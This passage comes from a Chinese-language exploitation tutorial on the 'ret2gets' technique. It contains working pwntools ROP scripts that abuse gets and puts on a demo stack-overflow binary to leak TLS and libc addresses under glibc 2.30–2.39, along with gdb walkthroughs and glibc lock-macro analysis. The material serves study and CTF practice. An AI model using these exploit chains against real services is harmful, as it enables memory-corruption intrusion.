
所以这里 `rdi` 变成了 `stdin._lock`，也就是变成了 `_IO_stdfile_0_lock`。

具体信息可通过下图 `gdb` 调试来得到，现在我们知道了 `_IO_stdfile_0_lock` 的来源。

![图片描述](upload/attach/202505/1005607\_JGXZS4CYD8CBH5H.webp)

注意在 `_IO_lock_unlock` 函数结束后下面还有一个 `__lll_lock_wait_private` 函数，但是没有关系，因为这个函数并不会破坏 `rdi`。

![图片描述](upload/attach/202505/1005607\_HSYY924VEGAQVBH.webp)

#### 为什么 `_IO_stdfile_0_lock` 要放入到 `rdi` 寄存器里面

上面我们分析了 `_IO_stdfile_0_lock` 的来源，但是为什么 `_lock` 会被加载到 `RDI` 中？

猜测这是编译器优化的结果，在调用 `lll_unlock` 的情况下，`_lock` 的地址作为唯一的参数直接传递给 `futex` 包装器（即通过 `rdi` 寄存器）。因此，它将 `_lock` 加载到 `rdi` 中，这样它就不需要使用额外的 `assignment` 来准备对 `futex` 的调用，例如 `mov rdi, [register containing _lock]`，从而节省了空间和时间。

下面来看一下 2.30 之前的 glibc 中的 `_IO_lock_unlock`。

![图片描述](upload/attach/202505/1005607\_KPDJRZ7FVJZ862F.webp)

上图是 glibc-2.29 的 `_IO_lock_unlock` 函数。

我们可以看到它不是将其加载到 `rdi` 中，而是使用 `mov rdx,[rbp+0x88]` 将其加载到 `rdx` 中，然后使用 `lea rdi,[rdx]` 加载到 `rdi` 中，这也说明 `_lock` 只有在非常特定的条件下才会被加载到 `rdi` 中，所以 ret2gets 并非在所有版本的 glibc 中都使用，它可能仅在部分高版本中适用。

#### ret2gets 的具体利用方法

上面就是 `gets` 函数源码的大致流程，那么通过分析我们就知道我们需要绕过的检测其实就是 `_IO_lock_lock` 和 `_IO_lock_unlock` 两个函数。

```c
#define _IO_lock_lock(_name) \
do { \
void *__self = THREAD_SELF; \
if ((_name).owner != __self) \
{ \
lll_lock ((_name).lock, LLL_PRIVATE); \
(_name).owner = __self; \
} \
++(_name).cnt; \
} while (0)
#define _IO_lock_unlock(_name) \
do { \
if (--(_name).cnt == 0) \
{ \
(_name).owner = NULL; \
lll_unlock ((_name).lock, LLL_PRIVATE); \
} \
} while (0)
```

1. 由于 `_IO_lock_unlock` 有一个 `--(_name).cnt == 0`，一旦这个判断成功，那么我们的 `owner` 就会变成 `NULL`，我们就无法再后续的 `puts` 中拿到 `TLS 地址`，也就是说我们需要覆盖 `_IO_lock_t` 结构体的 `cnt`，不能为 `1`。

2. 我们需要注意 `_IO_lock_t` 结构体在 `owner` 参数之前不能有 `\x00`，否则 `puts` 输出的时候会被截断。

3. 我们输入的数据第五个字节会被 `减去1`（也就是 `cnt` 会被减去 1）。

对于第三条，我们依旧使用之前的这个例子来证明：

```c
int main() {
    char buf[0x20];
    puts("ROP me if you can!");
    gets(buf);
}
```

```python
from pwn import *
e = context.binary = ELF('demo')
p = e.process()
# 由于最后一个调用的函数是gets，所以最后main函数返回的时候 rdi 就是指向我们的 _IO_lock_t 结构体地址
# 所以我们只需要溢出之后调用一次gets就可以往 _IO_lock_t 里面写入东西了
payload = b"A" * 0x20
payload += p64(0) # saved rbp
payload += p64(e.plt.gets)
p.sendlineafter(b"ROP me if you can!\n", payload)
gdb.attach(p)
p.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")
# 这里第五个字节会被-1所以传入的时候需要+1
# 我们传入 /bin0sh 字符串
p.interactive()
```

下面进入调试看看我们打入的 `bin0sh字符串` 会如何变化（下面这是两张截图拼一起了，看起来有点怪，将就一下）。

![图片描述](upload/attach/202505/1005607\_4NG57ARXQEY4W7K.webp)

总之我们可以知道，我们的第五个字符会被减去 1。

所以如果我们希望利用 `puts` 函数来泄露出 `owner` 中存储的 `TLS 地址`，那么我们可以使用下面这个 payload：

```python
p.sendline(b"A" * 4 + b"\x00"*3)
# 这里填充 \x00\x00\x00 开头本来就是\x00
```

而这个 payload 会让我们的 `_IO_lock_t` 结构体中的 `lock` 赋值为 `AAAA`，而将 `cnt` 变为 `\x00\x00\x00\x00`。

这个时候 `cnt-1` 反而会让 `\x00\x00\x00\x00` 通过整数溢出变成 `\xff\xff\xff\xff`。

![图片描述](upload/attach/202505/1005607\_PEPX8GWZDX4RGH4.webp)

这样我们就可以顺利绕过 `\x00` 导致的 `puts` 函数输出的截断了。

所以上述例子泄露 TLS 地址的 exp 如下：

```python
# glibc-2.30 to glibc-2.36
from pwn import *
e = context.binary = ELF('demo')
libc = ELF("libc")
p = e.process()
payload = b"A" * 0x20
payload += p64(0) # saved rbp
payload += p64(e.plt.gets)
payload += p64(e.plt.puts)
p.sendlineafter(b"ROP me if you can!\n", payload)
p.sendline(b"A" * 4 + b"\x00"*3)
p.recv(8)
tls = u64(p.recv(6) + b"\x00\x00")
log.info(f"tls: {hex(tls)}")
libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")
p.interactive()
```

上述 exp 在 2.35 上进行了测试，应该适用于 2.30-2.36，但 2.37 将 <a href="elink@a95K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3k6$3I4A6j5X3y4Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6o6u0Q4x3X3f1K6y4#2)9J5c8Y4y4G2N6i4u0U0k6g2)9J5c8Y4y4&6M7$3c8W2M7s2y4Q4x3V1k6F1M7s2c8D9i4K6u0r3M7%4c8V1K9h3!0Q4x3X3c8D9L8$3y4C8i4K6u0W2K9q4)9J5x3@1H3K6y4H3`.`.">`_IO_lock_lock`</a> 和 <a href="elink@1d0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3k6$3I4A6j5X3y4Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6o6u0Q4x3X3f1K6y4#2)9J5c8Y4y4G2N6i4u0U0k6g2)9J5c8Y4y4&6M7$3c8W2M7s2y4Q4x3V1k6F1M7s2c8D9i4K6u0r3M7%4c8V1K9h3!0Q4x3X3c8D9L8$3y4C8i4K6u0W2K9q4)9J5x3@1H3%4x3l9`.`.">`_IO_lock_unlock`</a> 更改为：

```c
#define _IO_lock_lock(_name) \
do { \
void *__self = THREAD_SELF; \
if (SINGLE_THREAD_P && (_name).owner == NULL) \
{ \
(_name).lock = LLL_LOCK_INITIALIZER_LOCKED; \
(_name).owner = __self; \
} \
else if ((_name).owner != __self) \
{ \
lll_lock ((_name).lock, LLL_PRIVATE); \
(_name).owner = __self; \
} \
else \
++(_name).cnt; \
} while (0)
#define _IO_lock_unlock(_name) \
do { \
if (SINGLE_THREAD_P && (_name).cnt == 0) \
{ \
(_name).owner = NULL; \
(_name).lock = 0; \
} \
else if ((_name).cnt == 0) \
{ \
(_name).owner = NULL; \
lll_unlock ((_name).lock, LLL_PRIVATE); \
} \
else \
--(_name).cnt; \
} while (0)
```

仅当 `cnt != 0` 时，`cnt` 才会递减。

这就导致我们没有办法再利用 `整数溢出` 来绕过 `\x00` 带来的截断。

但是没有关系，我们依旧有办法解决：

```python
# glibc-2.37 to glibc-2.39 更高版本未进行尝试
from pwn import *
e = context.binary = ELF('demo')
libc = ELF("libc")
p = e.process()
payload = b"A" * 0x20
payload += p64(0) # saved rbp
payload += p64(e.plt.gets)
payload += p64(e.plt.gets)
payload += p64(e.plt.puts)
p.sendlineafter(b"ROP me if you can!\n", payload)
p.sendline(p32(0) + b"A"*4 + b"B"*8)
p.sendline(b"CCCC")
p.recv(8)
tls = u64(p.recv(6) + b"\x00\x00")
log.info(f"tls: {hex(tls)}")
libc.address = tls + 0x28c0
log.info(f"libc: {hex(libc.address)}")
p.interactive()
```

我们来对着上面这个 exp 调试一下。

溢出之后的第一次 `gets`，我们输入了 `\x00\x00\x00\x00AAAABBBBBBBB`，而第一个 `A-1` 变成了 `0x40`。

![图片描述](upload/attach/202505/1005607\_BVNVAJE4J8D97NG.webp)

溢出之后的第二次 `gets`，我们输入了 `CCCC`，并且将原本的 `0x40` 覆盖成了字符串终止符 `\x00`（注意这还没有结束）。

![图片描述](upload/attach/202505/1005607\_EN3BK6S2SQNQE7V.webp)

最后执行我们执行 `cnt-1`。

![图片描述](upload/attach/202505/1005607\_B3WHKM88JQZJSVN.webp)

我们发现原本的 `0x41414100` 变成了 `0x414140ff`，我们依旧是完美的绕过了 `\x00` 以及各种检测。

### 额外的情况发生了怎么办呢？

下面我们探讨一个新问题：

虽然我们拥有 `gets`，但是最后程序结束的时候 `rdi != _IO_stdfile_0_lock` 怎么办？

比如下面这个例子：

```c
#include <stdio.h>
int main() {
    char buf[0x20];
    puts("ROP me if you can!");
    gets(buf);
    func(); // 未知函数，执行之后不知道 rdi 会是什么
}
```

那么会有以下几种情况：

1. `rdi` 虽然不是 `_IO_stdfile_0_lock`，但是依旧可写。

这种情况很简单，溢出之后调用一次 `gets`，`rdi` 就变成 `_IO_stdfile_0_lock`，然后思路后续还是一样的思路：2.30-2.36 调用 `gets` 然后调用 `puts` 泄露，2.37+ 则调用两次 `gets` 再调用 `puts`。

2. `rdi` 不可写了，但是可读。

没办法调用 `gets` 了，但是我们可以考虑直接使用 `puts` 是否会有效果。

3. `rdi == NULL`

大多数 IO 函数已经没办法使用了，但是 `printf` 依旧可用。

<a href="elink@436K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3k6$3I4A6j5X3y4Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6o6u0Q4x3X3f1K6y4g2)9J5c8Y4y4G2N6i4u0U0k6g2)9J5c8Y4y4@1k6r3W2G2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0r3M7s2u0A6L8Y4c8X3i4K6u0W2j5#2)9J5x3@1H3J5y4H3`.`.">`printf`</a> 定义如下：

```c
int
__printf (const char *format, ...)
{
va_list arg;
int done;
va_start (arg, format);
done = __vfprintf_internal (stdout, format, arg, 0);
va_end (arg);
return done;
}
```

在源码中我们可以看到它调用了 `__vfprintf_internal` 这个函数，并且第一个参数为 `stdout`，这意味着 `rdi` 寄存器将指向 `stdout`。

然后在 <a href="elink@e43K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3k6$3I4A6j5X3y4Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6o6u0Q4x3X3f1K6y4g2)9J5c8Y4y4G2N6i4u0U0k6g2)9J5c8Y4y4@1k6r3W2G2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0r3N6X3k6H3M7X3W2F1N6r3k6Q4x3X3c8A6L8Y4c8W2M7X3&6S2L8q4)9J5k6h3y4Q4x3U0y4x3x3e0p5%4z5b7`.`.">`__vfprintf_internal`</a> 中，我们看到它在早期调用 <a href="elink@c13K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3k6$3I4A6j5X3y4Q4x3V1k6Y4L8r3W2T1j5#2)9J5k6o6u0Q4x3X3f1K6y4g2)9J5c8Y4y4G2N6i4u0U0k6g2)9J5c8Y4y4@1k6r3W2G2i4K6u0V1j5$3!0E0L8h3!0F1i4K6u0r3N6X3k6H3M7X3W2F1N6r3k6Q4x3X3c8A6L8Y4c8W2M7X3&6S2L8q4)9J5k6h3y4Q4x3U0y4x3y4o6V1`.">`ARGCHECK`</a>

```c
int
vfprintf (FILE *s, const CHAR_T *format, va_list ap, unsigned int mode_flags)
{
...
/* Sanity check of arguments. */
ARGCHECK (s, format);
```
